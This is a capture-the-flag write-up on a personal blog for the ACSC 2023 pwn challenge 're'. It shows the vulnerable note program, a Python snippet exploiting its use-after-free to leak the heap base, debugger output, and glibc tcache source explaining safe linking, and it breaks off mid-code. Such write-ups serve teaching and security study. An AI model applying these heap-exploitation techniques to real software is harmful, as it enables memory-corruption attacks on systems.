<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>ACSC 2023 re(pwn) writeup - sl4yd4rk</title><meta name=Description content="This is my cool site"><meta property="og:title" content="ACSC 2023 re(pwn) writeup"><meta property="og:description" content="[pwn 300] re authored by shift-crops Sometimes you want to rewrite notes. Given files:
I didn&rsquo;t manage to solve this challenge during contest but I&rsquo;ve learnt a lot of new things including recently protection on heap (safe linking) and on pointer (pointer guard), the existence of tcache_perthread_struct, tls_dtor_list, and some other interesting tricks. I also did some set up to read glibc source code seriously. Therefore, I wanted to write a detail writeup."><meta property="og:type" content="article"><meta property="og:url" content="https://slaydarkkkk.github.io/acsc-2023-writeup/"><meta property="og:image" content="https://slaydarkkkk.github.io/logo.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-02-28T00:00:00+00:00"><meta property="article:modified_time" content="2023-02-28T00:00:00+00:00"><meta property="og:site_name" content="My cool site"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://slaydarkkkk.github.io/logo.png"><meta name=twitter:title content="ACSC 2023 re(pwn) writeup"><meta name=twitter:description content="[pwn 300] re authored by shift-crops Sometimes you want to rewrite notes. Given files:
I didn&rsquo;t manage to solve this challenge during contest but I&rsquo;ve learnt a lot of new things including recently protection on heap (safe linking) and on pointer (pointer guard), the existence of tcache_perthread_struct, tls_dtor_list, and some other interesting tricks. I also did some set up to read glibc source code seriously. Therefore, I wanted to write a detail writeup."><meta name=application-name content="sl4yd4rk"><meta name=apple-mobile-web-app-title content="sl4yd4rk"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://slaydarkkkk.github.io/acsc-2023-writeup/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=/lib/fontawesome-free/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/fontawesome-free/all.min.css></noscript><link rel=preload href=/lib/animate/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/animate/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"ACSC 2023 re(pwn) writeup","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/slaydarkkkk.github.io\/acsc-2023-writeup\/"},"genre":"posts","keywords":"pwn, heap, tcache struct tampering, exit handler tampering","wordcount":1398,"url":"https:\/\/slaydarkkkk.github.io\/acsc-2023-writeup\/","datePublished":"2023-02-28T00:00:00+00:00","dateModified":"2023-02-28T00:00:00+00:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"sl4yd4rk"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=sl4yd4rk><img class="lazyload logo" src=/svg/loading.min.svg data-src=/img/slaydark_avt.jpg data-srcset="/img/slaydark_avt.jpg, /img/slaydark_avt.jpg 1.5x, /img/slaydark_avt.jpg 2x" data-sizes=auto alt=/img/slaydark_avt.jpg title=/img/slaydark_avt.jpg width=192 height=192></a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>Posts </a><a class=menu-item href=/tags/>Tags </a><a class=menu-item href=/categories/>Categories </a><a class=menu-item href=/about/>About </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder="Search titles or contents..." id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span>
</span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=sl4yd4rk><img class="lazyload logo" src=/svg/loading.min.svg data-src=/img/slaydark_avt.jpg data-srcset="/img/slaydark_avt.jpg, /img/slaydark_avt.jpg 1.5x, /img/slaydark_avt.jpg 2x" data-sizes=auto alt=/img/slaydark_avt.jpg title=/img/slaydark_avt.jpg width=192 height=192></a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="Search titles or contents..." id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>Cancel</a></div><a class=menu-item href=/posts/ title>Posts</a><a class=menu-item href=/tags/ title>Tags</a><a class=menu-item href=/categories/ title>Categories</a><a class=menu-item href=/about/ title>About</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class="toc-content always-active" id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">ACSC 2023 re(pwn) writeup</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>sl4yd4rk</a></span>&nbsp;<span class=post-category>included in <a href=/categories/writeups/><i class="far fa-folder fa-fw" aria-hidden=true></i>writeups</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2023-02-28>2023-02-28</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;1398 words&nbsp;
<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;7 minutes&nbsp;</div></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>Contents</span>
<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#pwn-300-re>[pwn 300] re</a><ul><li><a href=#understand-the-binary>Understand the binary</a></li><li><a href=#leak-heap-base>Leak heap base</a></li><li><a href=#glibc-232s-safe-linking>Glibc-2.32&rsquo;s Safe Linking</a></li><li><a href=#leak-libc-base-and-control-tcache_perthread_struct>Leak libc base and control tcache_perthread_struct</a></li><li><a href=#tls_dtor_list>tls_dtor_list</a></li><li><a href=#pointer-mangling>Pointer mangling</a></li></ul></li></ul></nav></div></div><div class=content id=content><h1 id=pwn-300-re>[pwn 300] re</h1><blockquote><p>authored by shift-crops
Sometimes you want to rewrite notes.
Given files:</p></blockquote><p>I didn&rsquo;t manage to solve this challenge during contest but I&rsquo;ve learnt a lot of new things including recently protection on heap (safe linking) and on pointer (pointer guard), the existence of <code>tcache_perthread_struct</code>, <code>tls_dtor_list</code>, and some other interesting tricks. I also did some set up to read glibc source code seriously. Therefore, I wanted to write a detail writeup.</p><h2 id=understand-the-binary>Understand the binary</h2><p>Let&rsquo;s take a look at the source code given:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span><span class=lnt>91
</span><span class=lnt>92
</span><span class=lnt>93
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>int</span> <span class=nf>getnline</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>buf</span><span class=p>,</span> <span class=kt>int</span> <span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>int</span> <span class=nf>getint</span><span class=p>(</span><span class=kt>void</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>edit</span><span class=p>(</span><span class=kt>void</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>Memo</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>size_t</span> <span class=n>size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span><span class=o>*</span> <span class=n>buf</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>mlist</span><span class=p>[</span><span class=mi>10</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nf>__attribute__</span><span class=p>((</span><span class=n>constructor</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>int</span> <span class=nf>init</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>  <span class=nf>alarm</span><span class=p>(</span><span class=mi>30</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>setbuf</span><span class=p>(</span><span class=n>stdin</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>setbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>void</span><span class=p>){</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span><span class=p>(;;){</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>MENU</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;1. Edit</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;2. List</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;0. Exit</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;&gt; &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>switch</span><span class=p>(</span><span class=nf>getint</span><span class=p>()){</span>
</span></span><span class=line><span class=cl>      <span class=k>case</span> <span class=mi>0</span><span class=o>:</span>
</span></span><span class=line><span class=cl>        <span class=k>goto</span> <span class=n>end</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=k>case</span> <span class=mi>1</span><span class=o>:</span>
</span></span><span class=line><span class=cl>        <span class=nf>edit</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=k>case</span> <span class=mi>2</span><span class=o>:</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span><span class=p>(</span><span class=kt>int</span> <span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span><span class=o>&lt;</span><span class=k>sizeof</span><span class=p>(</span><span class=n>mlist</span><span class=p>)</span><span class=o>/</span><span class=k>sizeof</span><span class=p>(</span><span class=k>struct</span> <span class=n>Memo</span><span class=p>);</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=k>if</span><span class=p>(</span><span class=n>mlist</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>size</span> <span class=o>&gt;</span> <span class=mi>0</span> <span class=o>&amp;&amp;</span> <span class=n>mlist</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>buf</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;[%d] %.*s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>i</span><span class=p>,</span> <span class=p>(</span><span class=kt>int</span><span class=p>)</span><span class=n>mlist</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>size</span><span class=p>,</span> <span class=n>mlist</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nl>end</span><span class=p>:</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Bye.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>edit</span><span class=p>(</span><span class=kt>void</span><span class=p>){</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=n>idx</span><span class=p>,</span> <span class=n>size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Index: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span><span class=p>((</span><span class=n>idx</span> <span class=o>=</span> <span class=nf>getint</span><span class=p>())</span> <span class=o>&gt;=</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>mlist</span><span class=p>)</span><span class=o>/</span><span class=k>sizeof</span><span class=p>(</span><span class=k>struct</span> <span class=n>Memo</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Out of list&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Size: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span><span class=p>((</span><span class=n>size</span> <span class=o>=</span> <span class=nf>getint</span><span class=p>())</span> <span class=o>&gt;</span> <span class=mh>0x78</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Too big memo&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=o>*</span><span class=n>p</span> <span class=o>=</span> <span class=nf>realloc</span><span class=p>(</span><span class=n>mlist</span><span class=p>[</span><span class=n>idx</span><span class=p>].</span><span class=n>buf</span><span class=p>,</span> <span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span><span class=p>(</span><span class=n>size</span> <span class=o>&gt;</span> <span class=n>mlist</span><span class=p>[</span><span class=n>idx</span><span class=p>].</span><span class=n>size</span><span class=p>)</span>	<span class=c1>// size and idx can be 0
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>mlist</span><span class=p>[</span><span class=n>idx</span><span class=p>].</span><span class=n>buf</span> <span class=o>=</span> <span class=n>p</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>mlist</span><span class=p>[</span><span class=n>idx</span><span class=p>].</span><span class=n>size</span> <span class=o>=</span> <span class=n>size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Memo: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>getnline</span><span class=p>(</span><span class=n>mlist</span><span class=p>[</span><span class=n>idx</span><span class=p>].</span><span class=n>buf</span><span class=p>,</span> <span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Done&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>int</span> <span class=nf>getnline</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>buf</span><span class=p>,</span> <span class=kt>int</span> <span class=n>size</span><span class=p>){</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>len</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span><span class=p>(</span><span class=n>size</span> <span class=o>&lt;=</span> <span class=mi>0</span> <span class=o>||</span> <span class=p>(</span><span class=n>len</span> <span class=o>=</span> <span class=nf>read</span><span class=p>(</span><span class=n>STDIN_FILENO</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=n>size</span><span class=o>-</span><span class=mi>1</span><span class=p>))</span> <span class=o>&lt;=</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span><span class=p>(</span><span class=n>buf</span><span class=p>[</span><span class=n>len</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>==</span><span class=sc>&#39;\n&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>len</span><span class=o>--</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>buf</span><span class=p>[</span><span class=n>len</span><span class=p>]</span> <span class=o>=</span> <span class=sc>&#39;\0&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>len</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>int</span> <span class=nf>getint</span><span class=p>(</span><span class=kt>void</span><span class=p>){</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mh>0x10</span><span class=p>]</span> <span class=o>=</span> <span class=p>{};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>getnline</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>buf</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nf>atoi</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>It&rsquo;s a typical note challenge structure. We have an array of 10 notes of size 0-0x78. We can edit or show note&rsquo;s content. <code>edit()</code> is more noticable that implemented using <code>realloc()</code>, and input <code>size</code> can be 0 so we <code>free()</code> chunk, but pointer is not cleared after <code>free()</code>. So in summary we can use <code>edit()</code> to:</p><ul><li>Allocate new chunk for empty note</li><li>Allocate new bigger chunk for smaller note.</li><li>Edit note&rsquo;s content</li><li><strong>Free chunk, with pointer remained</strong></li></ul><h2 id=leak-heap-base>Leak heap base</h2><p>We can abuse the above finding to leak heap base by freeing a chunk that another idx point to.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># leak heap base</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x60</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x60</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>list</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=glibc-232s-safe-linking>Glibc-2.32&rsquo;s Safe Linking</h2><p><a href=https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/ target=_blank rel="noopener noreffer">https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/</a></p><p>Note that what we leaked is an encrypted form of chunk&rsquo;s fd:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>pwndbg</span><span class=o>&gt;</span> <span class=n>tel</span> <span class=o>&amp;</span><span class=n>mlist</span>
</span></span><span class=line><span class=cl><span class=mo>00</span><span class=o>:</span><span class=mo>0000</span><span class=err>│</span>  <span class=mh>0x558f84585040</span> <span class=p>(</span><span class=n>mlist</span><span class=p>)</span> <span class=err>◂—</span> <span class=mh>0x0</span>
</span></span><span class=line><span class=cl><span class=mo>01</span><span class=o>:</span><span class=mo>000</span><span class=mi>8</span><span class=err>│</span>  <span class=mh>0x558f84585048</span> <span class=p>(</span><span class=n>mlist</span><span class=o>+</span><span class=mi>8</span><span class=p>)</span> <span class=err>—▸</span> <span class=mh>0x558f84b632a0</span> <span class=err>◂—</span> <span class=mh>0x558f84b63</span>
</span></span><span class=line><span class=cl><span class=mo>02</span><span class=o>:</span><span class=mo>0010</span><span class=err>│</span>  <span class=mh>0x558f84585050</span> <span class=p>(</span><span class=n>mlist</span><span class=o>+</span><span class=mi>16</span><span class=p>)</span> <span class=err>◂—</span> <span class=mh>0x60</span> <span class=cm>/* &#39;`&#39; */</span>
</span></span><span class=line><span class=cl><span class=mo>03</span><span class=o>:</span><span class=mo>001</span><span class=mi>8</span><span class=err>│</span>  <span class=mh>0x558f84585058</span> <span class=p>(</span><span class=n>mlist</span><span class=o>+</span><span class=mi>24</span><span class=p>)</span> <span class=err>—▸</span> <span class=mh>0x558f84b632a0</span> <span class=err>◂—</span> <span class=mh>0x558f84b63</span>
</span></span><span class=line><span class=cl><span class=mo>04</span><span class=o>:</span><span class=mo>0020</span><span class=err>│</span>  <span class=mh>0x558f84585060</span> <span class=p>(</span><span class=n>mlist</span><span class=o>+</span><span class=mi>32</span><span class=p>)</span> <span class=err>◂—</span> <span class=mh>0x0</span>
</span></span><span class=line><span class=cl><span class=p>...</span> <span class=err>↓</span>     <span class=mi>3</span> <span class=n>skipped</span>
</span></span></code></pre></td></tr></table></div></div><p>This is because of glibc-2.32&rsquo;s safe linking.</p><p>Safe linking is a security mechanism to protect <code>malloc()</code>&rsquo;s single-linked lists from tampering by attacker.</p><p>In this case we encounter this protection when allocate and free tcache chunk</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/* Caller must ensure that we know tc_idx is valid and there&#39;s room
</span></span></span><span class=line><span class=cl><span class=cm>   for more chunks.  */</span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=n>__always_inline</span> <span class=kt>void</span>
</span></span><span class=line><span class=cl><span class=nf>tcache_put</span> <span class=p>(</span><span class=n>mchunkptr</span> <span class=n>chunk</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>tc_idx</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>tcache_entry</span> <span class=o>*</span><span class=n>e</span> <span class=o>=</span> <span class=p>(</span><span class=n>tcache_entry</span> <span class=o>*</span><span class=p>)</span> <span class=nf>chunk2mem</span> <span class=p>(</span><span class=n>chunk</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=cm>/* Mark this chunk as &#34;in the tcache&#34; so the test in _int_free will
</span></span></span><span class=line><span class=cl><span class=cm>     detect a double free.  */</span>
</span></span><span class=line><span class=cl>  <span class=n>e</span><span class=o>-&gt;</span><span class=n>key</span> <span class=o>=</span> <span class=n>tcache_key</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>e</span><span class=o>-&gt;</span><span class=n>next</span> <span class=o>=</span> <span class=nf>PROTECT_PTR</span> <span class=p>(</span><span class=o>&amp;</span><span class=n>e</span><span class=o>-&gt;</span><span class=n>next</span><span class=p>,</span> <span class=n>tcache</span><span class=o>-&gt;</span><span class=n>entries</span><span class=p>[</span><span class=n>tc_idx</span><span class=p>]);</span>
